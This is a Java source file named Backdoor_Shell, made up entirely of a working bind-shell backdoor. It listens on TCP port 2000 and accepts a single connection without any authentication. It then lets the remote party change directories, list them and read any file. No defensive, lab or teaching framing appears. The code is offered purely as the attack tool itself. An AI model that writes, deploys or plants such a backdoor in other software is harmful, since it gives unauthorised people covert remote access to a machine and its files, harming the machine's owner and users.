import java.io.*;
import java.net.*;

public class Backdoor_Shell {

	public static void main(String[] args) throws IOException {
		ServerSocket serverSocket = new ServerSocket(2000);
		Socket clientSocket = serverSocket.accept();
		
		InputStream inputStream = clientSocket.getInputStream();
        OutputStream outputStream = clientSocket.getOutputStream();
        BufferedReader inputReader = new BufferedReader(new InputStreamReader(inputStream));
        PrintWriter outputWriter = new PrintWriter(outputStream, true);
        
        outputWriter.println(getCommandPrompt());
        
        String inputLine;
        while ((inputLine = inputReader.readLine()) != null) {
            String[] commandParts = inputLine.trim().split(" ");
            String command = commandParts[0];
            String argument = null;
            if (commandParts.length > 1) {
                argument = commandParts[1];
            }
            String output = executeCommand(command, argument);
            outputWriter.println(output);
            outputWriter.println(getCommandPrompt());
        }
    }

		private static String getCommandPrompt() {
			String osName = System.getProperty("os.name");
			if (osName.startsWith("Windows")) {
				return System.getProperty("user.dir") + "> ";
			} else {
				return System.getProperty("user.dir") + " % ";
			}
    
	}
		 private static String executeCommand(String command, String argument) {
		        if (command.equals("cd")) {
		            return changeDirectory(argument);
		        } else if (command.equals("dir")) {
		            return listDirectory();
		        } else if (command.equals("cat")) {
		            return readFile(argument);
		        } else {
		            return "Unknown command: " + command;
		        }
		   }
		 
		 private static String changeDirectory(String directory) {
		        File newDirectory = new File(directory);
		        if (newDirectory.isDirectory()) {
		            System.setProperty("user.dir", directory);
		            return "";
		        } else {
		            return "Directory not found: " + directory;
		        }
		    }
		 
		 private static String listDirectory() {
		        File currentDirectory = new File(System.getProperty("user.dir"));
		        StringBuilder outputBuilder = new StringBuilder();
		        outputBuilder.append("List of files in ").append(currentDirectory.getAbsolutePath()).append("\n\n");
		        File[] files = currentDirectory.listFiles();
		        for (File file : files) {
		            String fileType = file.isDirectory() ? "Directory" : "File";
		            outputBuilder.append(file.getName()).append(" - ").append(fileType).append("\n\r");
		        }
		        outputBuilder.append(files.length).append(" files in total");
		        return outputBuilder.toString();
		    }
		 private static String readFile(String fileName) {
			 	File file = new File(fileName);
		        if (file.isFile()) {
		            try {
		                BufferedReader fileReader = new BufferedReader(new FileReader(file));
		                StringBuilder fileContentBuilder = new StringBuilder();
		                String line;
		                while ((line = fileReader.readLine()) != null) {
		                    fileContentBuilder.append(line).append("\n");
		                }
		                fileReader.close();
		                return fileContentBuilder.toString();
		            } catch (IOException e) {
		                return "Error reading file: " + fileName;
		            }
		        } else {
		            return "File not found: " + fileName;
		        }
		    }
}
              

	


